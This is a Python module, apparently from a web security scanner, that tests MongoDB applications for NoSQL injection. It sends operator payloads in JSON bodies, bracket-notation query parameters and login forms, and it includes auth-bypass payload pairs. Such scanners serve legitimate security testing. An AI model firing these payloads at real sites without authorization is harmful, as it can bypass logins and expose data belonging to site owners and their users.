"""
modules/vulns/nosql_injection.py — NoSQL (MongoDB) Injection testing

Attack vectors
--------------
1. JSON body injection on API endpoints  — replaces field values with
   MongoDB operators ($gt, $ne, $regex) to bypass auth or dump data.
2. Bracket-notation query params          — ?field[$ne]=x (PHP/Express
   parse these into objects automatically).
3. Login form NoSQL auth bypass           — POST to login forms with
   operator-injected JSON body.

Detection heuristics
--------------------
- 200 with different body length / content than a benign baseline
- 500 / "MongoServerError" / "CastError" / "BSONTypeError" in response
- Authentication bypass: 200 on login when baseline returns 401/403
"""

import asyncio
import json
import logging
import re
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

from core.finding import Finding
from core.http_client import make_client, PROBE_TIMEOUT

logger = logging.getLogger(__name__)

# MongoDB operator payloads
_OP_PAYLOADS = [
    {"$gt": ""},
    {"$ne": "zzz_zparty_nonexistent_xyzzy"},
    {"$regex": ".*"},
    {"$exists": True},
]

# Auth-bypass payload pairs (username, password)
_AUTH_BYPASS_PAIRS = [
    ({"$gt": ""}, {"$gt": ""}),
    ({"$ne": "invalid_xyz"}, {"$ne": "invalid_xyz"}),
    ({"$regex": ".*"}, {"$regex": ".*"}),
]

# Markers indicating a MongoDB error was exposed
_ERROR_PATTERNS = re.compile(
    r"MongoServerError|CastError|BSONTypeError|MongoError|"
    r"Failed to convert|E11000 duplicate|ValidationError.*path|"
    r"\$where|bufferMaxEntries",
    re.IGNORECASE,
)


def _is_json_endpoint(url: str, content_type: str) -> bool:
    ct = content_type.lower()
    return "json" in ct or url.rstrip("/").endswith(("/graphql", "/api", "/login", "/signin"))


def _looks_like_auth_success(status: int, body: str, baseline_status: int) -> bool:
    """True if a response that was formerly 401/403 is now 200."""
    if baseline_status in (401, 403) and status == 200:
        return True
    # Also detect token / session fields in the body
    if status == 200 and any(k in body for k in ('"token"', '"access_token"', '"session"', '"jwt"')):
        return True
    return False


class NoSqlInjection:
    async def run(self, ctx: dict) -> list[Finding]:
        findings: list[Finding] = []
        url = ctx["target_url"].rstrip("/")
        endpoints: list[str] = ctx.get("endpoints", [])
        forms: list[dict] = ctx.get("forms", [])
        sem = asyncio.Semaphore(10)

        # ── 1. API endpoint JSON injection ───────────────────────────────────
        api_endpoints = [
            e for e in endpoints
            if any(k in e.lower() for k in ("/api/", "/graphql", "/rest/", "/v1/", "/v2/"))
        ][:30]

        async def probe_json_endpoint(ep: str):
            async with sem:
                try:
                    async with make_client(timeout=PROBE_TIMEOUT) as client:
                        baseline = await client.get(ep)
                    baseline_len = len(baseline.text)

                    for payload in _OP_PAYLOADS:
                        # POST with each operator payload as the body
                        body = json.dumps({"query": payload, "filter": payload})
                        try:
                            async with make_client(timeout=PROBE_TIMEOUT) as client:
                                r = await client.post(
                                    ep,
                                    content=body,
                                    headers={"Content-Type": "application/json"},
                                )
                        except Exception:
                            continue

                        # Detection: error string or significant body change on 200
                        if _ERROR_PATTERNS.search(r.text):
                            findings.append(_make_finding(
                                title="NoSQL Injection — MongoDB Error Exposed",
                                severity="High",
                                description=(
                                    f"Sending a MongoDB operator payload to {ep} caused the server "
                                    f"to return a database error message, confirming NoSQL injection."
                                ),
                                url=ep,
                                proof=f"POST {ep}\nBody: {body}\n→ HTTP {r.status_code}\n{r.text[:500]}",
                                impact=4, likelihood=4,
                            ))
                            return

                        if r.status_code == 200 and abs(len(r.text) - baseline_len) > 200:
                            findings.append(_make_finding(
                                title="NoSQL Injection — Response Anomaly",
                                severity="Medium",
                                description=(
                                    f"Operator payload '{list(payload.keys())[0]}' sent to {ep} "
                                    f"caused an unexpected response size change "
                                    f"({baseline_len} → {len(r.text)} bytes), suggesting injection."
                                ),
                                url=ep,
                                proof=f"POST {ep}\nBody: {body}\n→ HTTP {r.status_code} ({len(r.text)} bytes vs baseline {baseline_len})",
                                impact=3, likelihood=3,
                            ))
                            return
                except Exception as exc:
                    logger.debug(f"NoSQL JSON probe {ep}: {type(exc).__name__}: {exc}")

        # ── 2. Bracket-notation query parameter injection ─────────────────────
        async def probe_bracket_params(ep: str):
            async with sem:
                parsed = urlparse(ep)
                qs = parse_qs(parsed.query, keep_blank_values=True)
                if not qs:
                    return
                try:
                    async with make_client(timeout=PROBE_TIMEOUT) as client:
                        baseline = await client.get(ep)
                    baseline_status = baseline.status_code
                    baseline_len = len(baseline.text)
                except Exception:
                    return

                for param in list(qs.keys())[:5]:
                    for op in ("$ne", "$gt", "$regex"):
                        injected_qs = dict(qs)
                        injected_qs[f"{param}[{op}]"] = ["zparty_nosql_test"]
                        del injected_qs[param]
                        new_query = urlencode(injected_qs, doseq=True)
                        probe_url = urlunparse(parsed._replace(query=new_query))
                        try:
                            async with make_client(timeout=PROBE_TIMEOUT) as client:
                                r = await client.get(probe_url)
                        except Exception:
                            continue

                        if _ERROR_PATTERNS.search(r.text):
                            findings.append(_make_finding(
                                title="NoSQL Injection — Bracket Notation",
                                severity="High",
                                description=(
                                    f"Parameter '{param}' in {ep} is vulnerable to bracket-notation "
                                    f"NoSQL injection (e.g. ?{param}[$ne]=). MongoDB error exposed."
                                ),
                                url=ep,
                                proof=f"GET {probe_url}\n→ HTTP {r.status_code}\n{r.text[:400]}",
                                impact=4, likelihood=4,
                            ))
                            return

                        if (r.status_code == 200 and baseline_status in (401, 403)):
                            findings.append(_make_finding(
                                title="NoSQL Injection — Auth Bypass via Query Param",
                                severity="Critical",
                                description=(
                                    f"Bracket-notation operator injection on '{param}' "
                                    f"bypassed authentication at {ep} (baseline: {baseline_status} → {r.status_code})."
                                ),
                                url=ep,
                                proof=f"GET {probe_url}\n→ HTTP {r.status_code} (was {baseline_status})",
                                impact=5, likelihood=4,
                            ))
                            return

        # ── 3. Login form NoSQL auth bypass ───────────────────────────────────
        async def probe_login_form(form: dict):
            async with sem:
                action = form.get("action", "")
                if not action:
                    return
                fields = form.get("fields", [])
                user_field = next((f["name"] for f in fields if any(
                    k in f.get("name", "").lower() for k in ("user", "email", "login", "name")
                ) and f.get("type") not in ("hidden", "submit")), None)
                pass_field = next((f["name"] for f in fields if any(
                    k in f.get("name", "").lower() for k in ("pass", "pwd", "secret", "credential")
                ) and f.get("type") not in ("hidden", "submit")), None)
                if not user_field or not pass_field:
                    return

                # Baseline: submit a clearly wrong credential
                try:
                    async with make_client(timeout=PROBE_TIMEOUT) as client:
                        baseline = await client.post(action, data={
                            user_field: "zparty_nosql_check_invalid_user_xyz",
                            pass_field: "zparty_nosql_check_invalid_pass_xyz",
                        })
                    baseline_status = baseline.status_code
                except Exception:
                    return

                for user_op, pass_op in _AUTH_BYPASS_PAIRS:
                    payload = {user_field: user_op, pass_field: pass_op}
                    json_body = json.dumps(payload)
                    try:
                        async with make_client(timeout=PROBE_TIMEOUT) as client:
                            r = await client.post(
                                action,
                                content=json_body,
                                headers={"Content-Type": "application/json"},
                            )
                    except Exception:
                        continue

                    if _looks_like_auth_success(r.status_code, r.text, baseline_status):
                        findings.append(_make_finding(
                            title="NoSQL Injection — Authentication Bypass",
                            severity="Critical",
                            description=(
                                f"MongoDB operator payloads in the JSON body of a POST to {action} "
                                f"bypassed authentication. The server returned HTTP {r.status_code} "
                                f"when a valid baseline returned {baseline_status}."
                            ),
                            url=action,
                            proof=(
                                f"POST {action}\n"
                                f"Content-Type: application/json\n"
                                f"Body: {json_body}\n"
                                f"→ HTTP {r.status_code} (baseline: {baseline_status})"
                            ),
                            impact=5, likelihood=5,
                        ))
                        return

                    if _ERROR_PATTERNS.search(r.text):
                        findings.append(_make_finding(
                            title="NoSQL Injection — Login Form MongoDB Error",
                            severity="High",
                            description=(
                                f"Sending MongoDB operator payloads to the login form at {action} "
                                f"triggered a database error response, confirming NoSQL injection."
                            ),
                            url=action,
                            proof=f"POST {action}\nBody: {json_body}\n→ HTTP {r.status_code}\n{r.text[:400]}",
                            impact=4, likelihood=4,
                        ))
                        return

        logger.info(
            f"NoSQL injection: {len(api_endpoints)} API endpoints, "
            f"{len(endpoints)} param endpoints, {len(forms)} login forms"
        )

        tasks = (
            [probe_json_endpoint(ep) for ep in api_endpoints] +
            [probe_bracket_params(ep) for ep in endpoints if "?" in ep] +
            [probe_login_form(f) for f in forms[:20]]
        )
        await asyncio.gather(*tasks, return_exceptions=True)

        return findings


# ── Helpers ──────────────────────────────────────────────────────────────────

def _make_finding(
    title: str, severity: str, description: str,
    url: str, proof: str, impact: int, likelihood: int,
) -> Finding:
    return Finding(
        title=title,
        severity=severity,
        description=description,
        affected_url=url,
        proof=proof,
        remediation=(
            "1. Never pass user-controlled values directly into MongoDB queries. "
            "2. Use parameterised query builders (e.g. Mongoose schema validation). "
            "3. Validate and sanitise all inputs — reject objects where strings are expected. "
            "4. Disable operator injection by using '$' key stripping middleware. "
            "5. Run MongoDB with least-privilege credentials."
        ),
        impact=impact,
        likelihood=likelihood,
        module="NoSqlInjection",
        references=[
            "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection",
            "https://cwe.mitre.org/data/definitions/943.html",
        ],
    )
